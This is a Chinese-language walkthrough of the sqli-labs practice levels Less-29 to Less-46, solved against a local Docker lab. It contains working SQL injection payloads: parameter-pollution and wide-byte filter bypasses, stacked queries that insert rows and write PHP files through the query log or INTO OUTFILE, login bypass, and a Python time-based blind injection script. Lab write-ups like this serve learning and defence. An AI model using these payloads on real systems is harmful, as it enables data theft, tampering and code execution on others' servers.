</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>测试：尝试传入<code>?id=1&amp;id=2</code>，可以发现页面显示的用户名不再是<code>Dumb</code>，而实<code>Angelina</code></p> <p>这关 login.php 设置了一个白名单WAF，只允许数字，不过获取匹配的参数 $_SERVER['QUERY_STRING'] 然后匹配到第一个 id 就 break 掉了。但 PHP 通过 $_GET['id'] 获取是覆盖关系，即同时存在多个URL参数时，只获取最后一个。但WAF判断的是第1个，所以就可以绕过了。这种方式也叫HPP，HTTP 参数污染</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/58.png" alt="58"></p> <h2 id="less-30"><a href="#less-30" class="header-anchor">#</a> Less-30</h2> <p>同上关有些不同，需要在新的参数<code>id</code>里进行原sql语句的闭合测试</p> <p>这题是双引号类型</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/59.png" alt="59"></p> <h2 id="less-31"><a href="#less-31" class="header-anchor">#</a> Less-31</h2> <p>测试闭合原sql语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/60.png" alt="60"></p> <h2 id="less-32-宽字节注入"><a href="#less-32-宽字节注入" class="header-anchor">#</a> Less-32 宽字节注入</h2> <p>源码里，通过转义过滤了传入的单双引号，避免拼接到sql语句里成为闭合符</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\\\\\&quot;</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\&quot;/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\\&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>通过转义来实现过滤单双引号的安全措施，可以宽字节注入绕过，引用<code>mysql注入天书</code>作者对宽字节注入的解释</p> <p><img src="/medias/sqli-labs/61.png" alt="61"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/62.png" alt="62"></p> <p>传入id后，单引号被转义<code>\'</code>，在mysql使用gbk编码时，两个字节作为一个汉字，在<code>%df</code>遇到<code>%5c</code>时，会把<code>%df%5c</code>看作一个汉字<code>運</code>，吞掉了<code>%5c</code>的转义作用，绕过了过滤</p> <p><img src="/medias/sqli-labs/63.png" alt="63"></p> <p>发现sql语句转换16进制时，转义字符<code>\</code>被系统吃了，逆天，补一个5c</p> <p>前面做题多了，可以知道单引号是<code>27</code>，找到两个27大概就是要找的单引号，补一个<code>5c</code></p> <p><img src="/medias/sqli-labs/65.png" alt="65"></p> <p>补充<code>df</code>，看<code>df5c</code>的效果</p> <p><img src="/medias/sqli-labs/64.png" alt="64"></p> <p>现在可以知道，<code>0xdf</code>和<code>0x5c</code>两个字节在一起会解释为一个汉字<code>運</code>。在url就是<code>%df</code>、<code>%5c</code></p> <p>直接高强度日站</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span>df'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">11</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/66.png" alt="66"></p> <h2 id="less-33"><a href="#less-33" class="header-anchor">#</a> Less-33</h2> <p>和上题有区别吗？好像没有，区别是上关是出题人自己定义一个转义函数，这里使用自带的<code>addslashes</code>函数</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/67.png" alt="67"></p> <h2 id="less-34-post"><a href="#less-34-post" class="header-anchor">#</a> Less-34 POST</h2> <p>这道题使用post方式提交参数，用bp抓包提交</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span>df<span class="token string">'union%20select%20version(),user()%23&amp;passwd=1'</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/68.png" alt="68"></p> <h2 id="less-35"><a href="#less-35" class="header-anchor">#</a> Less-35</h2> <p>提示整型注入，好像什么过滤也没有？</p> <p><img src="/medias/sqli-labs/69.png" alt="69"></p> <h2 id="less-36"><a href="#less-36" class="header-anchor">#</a> Less-36</h2> <p>题目提示<code>bypass mysql_real_escape_string</code>，绕过<code>mysql_real_escape_string</code>函数</p> <p>在<code>mysql注入天书</code>里，作者提到</p> <p><img src="/medias/sqli-labs/70.png" alt="70"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span>df'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>如果要防范<code>MYSQL_real_escape_string</code>，需要把mysql设置为<code>gbk</code>编码，那么说，非gbk编码时，<code>mysql_real_escape_string</code>函数会像上面<code>addslashes</code>一样，转义但存在宽字节注入？</p> <p>翻看源码，发现，这题使用的就是<code>gbk</code>编码？？？</p> <p><img src="/medias/sqli-labs/71.png" alt="71"></p> <h2 id="less-37"><a href="#less-37" class="header-anchor">#</a> Less-37</h2> <p>我入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df'<span class="token operator">%</span><span class="token number">20</span><span class="token operator">or</span><span class="token operator">%</span><span class="token number">201</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>passwd<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/72.png" alt="72"></p> <p>🤯 转义的尽头是<code>%df</code>吗？</p> <h2 id="less-38-堆叠注入"><a href="#less-38-堆叠注入" class="header-anchor">#</a> Less-38 堆叠注入</h2> <p>老天奶，终于到下一个页面了，堆叠注入</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>oracle 不能使用堆叠注入，mysql、sqlserver、postgresql 都可以</p></div> <p>一直没有了解为什么有时候只能联合注入，有时候甚至可以对堆叠注入，学习下源码</p> <p>之前的注入执行语句</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>这题的堆叠注入语句</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1&quot;</span><span class="token punctuation">;</span>
<span class="token comment">/* execute multi query */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>相比，原来这里的<code>mysqli_multi_query</code>函数，可以执行多条sql语句，所以可以堆叠注入🤯</p> <p>联合查询就好像就够用了，我拿堆叠注入有什么新姿势？</p> <p>给站长留条数据☝🤓</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
?id=0'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">';insert into users values(100,'</span>imsb'<span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/medias/sqli-labs/75.png" alt="75"></p> <p>堆叠注入是不是可以执行任意sql语句</p> <p>打开日志记录，修改日志文件、目录，查询恶意字符串写入日志</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">';set global general_log='</span><span class="token keyword">on</span><span class="token string">';set global general_log_file='</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">38</span><span class="token operator">/</span><span class="token number">4.</span>php'<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我测，这里为什么写进去没有解析🤯</p> <p>记录一下，sql堆叠注入通过日志写入木马流程</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 打开日志记录</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">;</span>
<span class="token comment"># 设置日志文件</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'/var/www/html/Less-38/4.php'</span><span class="token punctuation">;</span>
<span class="token comment"># 写入恶意字符串</span>
<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="less-39"><a href="#less-39" class="header-anchor">#</a> Less-39</h2> <p>整型注入，尝试日志写马子还是失败了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'/var/www/html/Less-39/1.php'</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3c3f3d706870696e666f28293b3f3e</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我直接进容器调试</p> <p>破案，mysql写的文件没有执行权限，我直接一个高权限战士</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> sqli-lab /bin/sh
<span class="token function">chmod</span> <span class="token number">777</span> /var/www/html/Less-39/*.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/sqli-labs/76.png" alt="76"></p> <p>这又是什么奇怪的报错 🤯</p> <p><img src="/medias/sqli-labs/77.png" alt="77"></p> <p>重新写试试，还是不行，开溜！</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?=phpinfo();?&gt;'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-39/2.php'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/78.png" alt="78"></p> <h2 id="less-40"><a href="#less-40" class="header-anchor">#</a> Less-40</h2> <p>通过页面回显可以测试出后台id是<code>')</code>包裹的</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>看<code>mysql注入天书</code>作者在经常使用<code>insert</code>语句，多用熟悉一下</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">');insert into users values(101,'</span>imsb'<span class="token punctuation">,</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/79.png" alt="79"></p> <h2 id="less-41"><a href="#less-41" class="header-anchor">#</a> Less-41</h2> <p>整型注入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> users <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token string">'Jay'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/80.png" alt="80"></p> <h2 id="less-42"><a href="#less-42" class="header-anchor">#</a> Less-42</h2> <p>查看源码，题目在登录的处理方面，对<code>username</code>做了过滤，<code>password</code>没有过滤</p> <p><img src="/medias/sqli-labs/81.png" alt="81"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>login_password<span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1=1;select '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">42</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>login_user<span class="token operator">=</span>admin<span class="token operator">&amp;</span>mysubmit<span class="token operator">=</span>Login
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/82.png" alt="82"></p> <h2 id="less-43"><a href="#less-43" class="header-anchor">#</a> Less-43</h2> <p>查看源码，整体逻辑没变，参数的拼接方式换成了<code>('')</code>包裹了</p> <p><img src="/medias/sqli-labs/83.png" alt="83"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>login_password<span class="token operator">=</span><span class="token number">1</span><span class="token string">') or 1=1;select '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">43</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>login_user<span class="token operator">=</span>admin<span class="token operator">&amp;</span>mysubmit<span class="token operator">=</span>Login
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/84.png" alt="84"></p> <h2 id="less-44"><a href="#less-44" class="header-anchor">#</a> Less-44</h2> <p>登录处理还是没有修复</p> <p><img src="/medias/sqli-labs/85.png" alt="85"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>login_password<span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1=1;select '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">44</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>login_user<span class="token operator">=</span>admin<span class="token operator">&amp;</span>mysubmit<span class="token operator">=</span>Login
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-45"><a href="#less-45" class="header-anchor">#</a> Less-45</h2> <p>漏洞测试变成代码审计了（x），不想挨个测了，我直接看源码</p> <p><img src="/medias/sqli-labs/86.png" alt="86"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>login_password<span class="token operator">=</span><span class="token number">1</span><span class="token string">') or 1=1;select '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">45</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>login_user<span class="token operator">=</span>admin<span class="token operator">&amp;</span>mysubmit<span class="token operator">=</span>Login
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-46-order-by注入"><a href="#less-46-order-by注入" class="header-anchor">#</a> Less-46 order by注入</h2> <p>order by注入，举例源码</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$id</span></span>&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="order-by-数字"><a href="#order-by-数字" class="header-anchor">#</a> order by + 数字</h3> <p>order by后的参数id可以作为一个注入点，可以尝试使用<code>?sort=1 desc</code>、<code>?sort=1 asc</code>，来检测order by后能不能拼接参数，构造一些sql语句，爆出数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">desc</span>
?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">asc</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>尝试报错注入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
?sort<span class="token operator">=</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/sqli-labs/87.png" alt="87"></p> <p><img src="/medias/sqli-labs/88.png" alt="88"></p> <p>时间盲注，页面进入加载状态</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?sort<span class="token operator">=</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/89.png" alt="89"></p> <p>写个时间盲注脚本</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-46/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        sort <span class="token operator">=</span> <span class="token string">&quot;if((substr((select group_concat(schema_name) from information_schema.schemata),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># sort = &quot;if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># sort = &quot;if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?sort=&quot;</span> <span class="token operator">+</span> sort
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
